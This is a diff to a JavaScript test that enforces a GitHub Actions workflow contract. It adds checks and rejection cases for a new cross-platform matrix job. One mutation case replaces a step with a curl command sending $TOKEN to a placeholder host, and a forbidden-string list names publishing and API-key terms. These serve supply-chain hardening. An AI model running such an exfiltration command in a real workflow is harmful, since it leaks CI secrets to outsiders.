@@ -29,7 +29,7 @@ function validate(document) {
 	assert.equal(document.name, 'runtime');
 	assert.deepEqual(document.on, { pull_request: null, push: { branches: ['main'] }, workflow_call: null });
 	assert.deepEqual(document.permissions, { contents: 'read' });
-	assert.deepEqual(Object.keys(document.jobs ?? {}), ['check']);
+	assert.deepEqual(Object.keys(document.jobs ?? {}), ['check', 'platform']);
 	const job = document.jobs.check;
 	assert.deepEqual(Object.keys(job ?? {}).sort(), ['runs-on', 'steps']);
 	assert.equal(job['runs-on'], 'ubuntu-latest');
@@ -49,6 +49,18 @@ function validate(document) {
 		{ run: ANCESTRY_GUARD },
 		{ run: 'make check' },
 	]);
+	const platform = document.jobs.platform;
+	assert.deepEqual(Object.keys(platform ?? {}).sort(), ['runs-on', 'steps', 'strategy']);
+	assert.deepEqual(platform.strategy, { 'fail-fast': false, matrix: { os: ['ubuntu-latest', 'macos-latest'] } });
+	assert.equal(platform['runs-on'], '${{ matrix.os }}');
+	assert.deepEqual(platform.steps, [
+		{ uses: CHECKOUT, with: { 'persist-credentials': false } },
+		{ uses: SETUP_NODE, with: { 'node-version': '22.22.0', cache: 'npm', 'cache-dependency-path': 'bot/package-lock.json' } },
+		{ run: 'make -C bot install' },
+		{ run: 'test "$(id -u)" -ne 0' },
+		{ run: 'make platformcheck' },
+	]);
+	assert.equal(Object.hasOwn(platform, 'needs'), false);
 	const source = JSON.stringify(document).toLowerCase();
 	for (const forbidden of ['make smoke', 'deploy-pages', 'upload-pages', 'npm publish', 'provider_api_key']) {
 		assert.equal(source.includes(forbidden), false, `workflow contains forbidden ${forbidden}`);
@@ -96,6 +108,16 @@ test('the workflow contract rejects each weakened essential and prohibited work'
 		(document) => { document.jobs.check.steps.push(structuredClone(document.jobs.check.steps[0])); },
 		(document) => { document.jobs.check.steps[6] = { run: 'curl https://example.test/?token=$TOKEN' }; },
 		(document) => { document.jobs.check.steps.push({ uses: 'actions/upload-pages-artifact@v3' }); },
+		(document) => { document.jobs.platform.strategy.matrix.os = ['ubuntu-latest']; },
+		(document) => { document.jobs.platform.strategy.matrix.os.push('windows-latest'); },
+		(document) => { document.jobs.platform.strategy['fail-fast'] = true; },
+		(document) => { document.jobs.platform.needs = 'check'; },
+		(document) => { action(document.jobs.platform.steps, 'actions/checkout').uses = 'actions/checkout@v4'; },
+		(document) => { action(document.jobs.platform.steps, 'actions/checkout').with['persist-credentials'] = true; },
+		(document) => { action(document.jobs.platform.steps, 'actions/setup-node').with['node-version'] = '22.21.0'; },
+		(document) => { command(document.jobs.platform.steps, 'make -C bot install').run = 'npm install'; },
+		(document) => { command(document.jobs.platform.steps, 'make platformcheck').run = 'make check'; },
+		(document) => { command(document.jobs.platform.steps, 'make platformcheck')['continue-on-error'] = true; },
 	];
 	for (const mutate of mutations) {
 		const changed = structuredClone(original);
